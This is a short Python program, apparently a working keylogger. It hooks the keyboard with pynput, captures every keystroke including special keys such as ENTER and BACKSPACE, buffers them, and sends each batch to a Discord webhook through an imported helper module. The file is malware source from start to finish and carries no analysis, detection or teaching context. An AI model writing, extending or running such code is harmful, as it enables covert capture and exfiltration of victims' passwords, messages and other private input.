from pynput import keyboard
import threading
import datetime
import sys
import disWebhook

listener = None

# buffer and timer for batching keystrokes
lock = threading.Lock()
_buffer = []
_buffer_timer = None
BUFFER_TIMEOUT = 0.7  # seconds of inactivity before flushing buffer

def _flush_buffer():
    """Send the buffered keystrokes to Discord and clear the buffer."""
    global _buffer_timer
    # build message and clear buffer under lock, send outside lock
    with lock:
        if not _buffer:
            _buffer_timer = None
            return
        message = ''.join(_buffer)
        _buffer.clear()
        _buffer_timer = None

    # send outside lock to avoid blocking other key handling
    disWebhook.send_discord_message(message)

def on_press(key):
    # buffer keystrokes and reset inactivity timer
    try:
        k = key.char
    except AttributeError:
        updated_key = update_key_display(key)
        k = "`" + str(updated_key) + "`"
    k = k.replace("'", "")

    global _buffer_timer
    with lock:
        _buffer.append(k)
        # cancel existing timer and restart
        if _buffer_timer is not None:
            try:
                _buffer_timer.cancel()
            except Exception:
                pass
        _buffer_timer = threading.Timer(BUFFER_TIMEOUT, _flush_buffer)
        _buffer_timer.daemon = True
        _buffer_timer.start()

def on_release(key):
    # no-op for now; kept for completeness
    return

def start_listener():
    global listener
    if listener is None:
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()  # runs in background thread

def stop_listener():
    global listener, _buffer_timer
    # stop the listener and flush any remaining buffered keys
    if listener is not None:
        listener.stop()
        listener = None
    # cancel timer if running then flush
    if _buffer_timer is not None:
        try:
            _buffer_timer.cancel()
        except Exception:
            pass
    _flush_buffer()
    print('Key listener stopped.')

def update_key_display(k):
        # accept Key objects or strings
        k_str = str(k)
        special_map = {
            'Key.space': 'SPACE',
            'Key.enter': 'ENTER',
            'Key.tab': 'TAB',
            'Key.shift': 'SHIFT',
            'Key.shift_r': 'SHIFT_R',
            'Key.ctrl': 'CTRL',
            'Key.ctrl_r': 'CTRL_R',
            'Key.alt': 'ALT',
            'Key.alt_r': 'ALT_R',
            'Key.backspace': 'BACKSPACE',
            'Key.caps_lock': 'CAPS_LOCK',
            'Key.esc': 'ESC',
            'Key.up': 'ARROW_UP',
            'Key.down': 'ARROW_DOWN',
            'Key.left': 'ARROW_LEFT',
            'Key.right': 'ARROW_RIGHT',
            'Key.print_screen': 'PRINT_SCREEN',
            'Key.insert': 'INSERT',
            'Key.delete': 'DELETE',
            'Key.home': 'HOME',
            'Key.end': 'END',
            'Key.page_up': 'PAGE_UP',
            'Key.page_down': 'PAGE_DOWN',
            'Key.media_volume_up': 'VOL_UP',
            'Key.media_volume_down': 'VOL_DOWN'
        }
        # map the key to a nicer display name
        fixedKey = special_map.get(k_str, k_str)
        return fixedKey

if __name__ == "__main__":
    start_listener()
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        stop_listener()
        print('Exiting.')